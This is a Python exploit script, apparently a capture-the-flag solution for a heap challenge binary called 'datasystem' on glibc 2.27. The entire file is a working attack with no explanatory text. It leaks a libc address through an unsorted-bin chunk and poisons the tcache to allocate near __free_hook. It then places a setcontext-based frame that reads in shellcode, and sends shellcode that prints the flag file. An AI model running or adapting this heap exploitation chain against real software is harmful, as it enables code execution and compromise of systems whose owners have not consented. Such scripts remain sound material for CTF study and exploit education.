# from LibcSearcher import *
from helper import *
from exp import ret2libc_A, ret2libc_B
loader = Loader("target/datasystem", 64, debug=True)
loader.patch(2.27)
elf,libc = loader.init()
# io = loader.process()
io = loader.ida()
abbre(globals(), io, loader) # 此处定义了常用的缩写
menu(globals())


def login():
    sa(b'please input username: ', b'admin\x00')
    sa(b'please input password: ', b'c' * 0x20)

login()
add(0x440, b'aaaa') # 0
add(0x10, b'bbbb')  # 1
# pause()
free(0)
add(0x8, b'c'*8)    # 0    
show(0)
leak = uu64(ru(b"\x7f")[-6:])
info(f"leak: {hex(leak)} (main_arena+1120)")
main_arena = leak-1120
malloc_hook = main_arena - 0x10
libc_base = malloc_hook - libc.sym['__malloc_hook']
success(f"libc_base: {hex(libc_base)}")
libc.address = libc_base # from now on, libc.sym["xx"] returns real addr

add(0x20,b"dddd")   # 2
free(2)
free(0)

add(0x10, flat({
    0x18:0x31, 
    0x20:libc.sym['__free_hook'] - 0x200
},filler=b"\x00")) # 0
add(0x20, '\n')

add(0x20, flat({
    0x68:0,
    0x70:0x23330000,
    0x88:0x200,
    0xa0:libc.sym['__free_hook']-0x100,
    0xa8:libc.sym['read'],
    0x100:0x23330000,
    0x200:libc.sym['setcontext']+53
},filler=b"\x00"))

free(3)
sl(asm(shellcraft.cat("flag")))
shell()